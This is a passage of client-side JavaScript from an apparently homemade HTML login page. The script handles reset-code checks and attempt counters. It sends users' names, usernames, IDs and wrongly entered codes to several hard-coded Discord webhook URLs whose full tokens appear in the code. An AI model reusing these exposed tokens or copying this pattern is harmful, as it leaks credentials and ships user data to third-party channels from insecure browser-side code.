        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetLogEmbed);

        if (isCorrect) {
          // Success scenario
          logAction("Reset Code Accepted");
          const correctResetEmbed = {
            title: "✅ Reset Code Accepted", color: 0x00ff00,
            fields: [
              { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
              { name: "User ID", value: userID, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
          };
          const correctResetWebhook = "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB";
          await sendWebhook(correctResetWebhook, correctResetEmbed);

          attempts = 3; // Reset attempts to initial value
          if (loginAttemptCounterDisplay) loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
          if (attemptsText) attemptsText.textContent = `Attempts Left: ${attempts}`;

          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          loginBox.style.borderColor = 'white'; // Reset style
          loginBox.style.boxShadow = '0 0 15px white'; // Reset style
        } else {
          // Failure scenario
          logAction("Incorrect Reset Code Attempt");
          const incorrectResetEmbed = {
            title: "❌ Incorrect Reset Code Attempt", color: 0xff0000,
            fields: [
              { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
              { name: "User ID", value: userID, inline: true }, { name: "Entered Code", value: enteredCode, inline: false },
              { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
            ]
          };
          const incorrectResetWebhook = "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";
          await sendWebhook(incorrectResetWebhook, incorrectResetEmbed);

          alert('Incorrect reset code.');
          resetField.value = ''; // Clear the field after incorrect attempt
        }
      }

      // Event listeners for login form actions
      if (submitBtn) {
        submitBtn.addEventListener('click', submitLogin);
      }
      if (resetBtn) {
        resetBtn.addEventListener('click', resetCounter);
      }

      // Enter key submission logic
      document.addEventListener('keydown', e => {
        // If focus is on resetField and Enter is pressed, handle reset
        if (e.key === 'Enter' && document.activeElement === resetField) {
            resetCounter();
        } else if (e.key === 'Enter' && (document.activeElement === usernameInput || document.activeElement === passwordInput || document.activeElement === userIDInput)) {
            // If focus is on any of the input fields, submit login form
            submitLogin();
        }
      });

      // Initialize attempts display on load
      if (loginAttemptCounterDisplay) {
        loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
      }
      if (attemptsText) {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }
      
      // Hide login elements initially until user data is loaded
      if (loginBox) loginBox.style.display = 'none';
    })(); // End of Login System IIFE

  </script>
</body>
</html>
